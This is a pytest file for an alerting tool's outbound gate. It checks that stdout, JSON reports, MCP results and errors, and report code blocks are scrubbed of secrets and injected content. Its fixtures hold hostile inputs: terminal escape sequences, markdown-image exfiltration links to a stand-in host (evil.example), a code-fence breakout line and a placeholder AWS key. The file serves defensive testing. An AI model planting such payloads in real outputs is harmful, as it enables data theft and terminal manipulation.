"""Every way out of the process passes the outbound gate (audit A-C-8, A-C-9).

Slack/Teams/webhook go through chatops.notify (tests/test_gate.py). This covers the others: stdout,
the --json report file, MCP results and errors, and the deployed-source block in a report.
"""

from __future__ import annotations

import json

from warden import mcp_server
from warden.cli import main
from warden.models import Alert, ContextBundle, Severity
from warden.reporting import build_report

KEY = "AKIAIOSFODNN7EXAMPLE"


def _alert_file(tmp_path, **kw):
    alert = dict(alert_id="eg-1", name="Checkout\x1b[2J\x1b]8;;https://evil.example\x07errors", severity="high",
                 service="checkout", environment="staging", summary=f"5xx; leaked key {KEY}",
                 started_at="2026-09-28T10:00:00Z", **kw)
    path = tmp_path / "alert.json"
    path.write_text(json.dumps(alert), encoding="utf-8")
    return path


def test_stdout_carries_no_escape_sequence_and_no_secret(tmp_path, capsys):
    main(["run", "--alert", str(_alert_file(tmp_path)), "--report"])
    out = capsys.readouterr().out
    assert "\x1b" not in out and "\x07" not in out
    assert KEY not in out


def test_the_json_report_file_holds_no_secret(tmp_path, capsys):
    target = tmp_path / "r.json"
    main(["run", "--alert", str(_alert_file(tmp_path)), "--json", str(target)])
    text = target.read_text(encoding="utf-8")
    assert KEY not in text
    json.loads(text)  # still valid JSON after the scrub


def test_an_mcp_result_is_gated():
    result = mcp_server._ok({"hypothesis": "see ![x](https://evil.example/c?d=1)", "ref": "warden-prod-deploy"})
    assert "evil.example" not in json.dumps(result.structured_content)
    assert result.structured_content["ref"] == "warden-prod-deploy"
    blocked = mcp_server._ok({"note": f"key {KEY}"})
    assert KEY not in json.dumps(blocked.structured_content) and blocked.structured_content["withheld"]


def test_an_mcp_error_message_is_gated():
    err = mcp_server._err(f"KeyError: '\x1b[31m![x](https://evil.example/c) {KEY}'")
    text = err.content[0].text
    assert "\x1b" not in text and "evil.example" not in text and KEY not in text


def test_deployed_source_cannot_close_its_code_block():
    """A-C-9, defence in depth: real SOURCE lines start with their line number (aws_stack.py), so
    none can begin with a fence today. The report escapes fences in them anyway, so a future source
    format - or another backend - cannot end the block and put package text outside it."""
    logs = ["CODE checkout app/handler.py:12 in charge: KeyError: 'x'",
            "SOURCE checkout app/handler.py:```",
            "SOURCE checkout app/handler.py:![x](https://evil.example/c?d=1)"]
    alert = Alert(alert_id="c-1", name="n", severity=Severity.high, service="checkout", environment="staging",
                  summary="s", started_at="2026-09-28T10:00:00Z")
    md = build_report(alert, context=ContextBundle(logs=logs)).markdown
    body = md.split("```python\n", 1)[1].split("\n")
    block = body[:next(i for i, ln in enumerate(body) if ln.startswith(("```", "~~~")))]
    assert any("evil.example" in ln for ln in block), "the source lines stay inside their block"
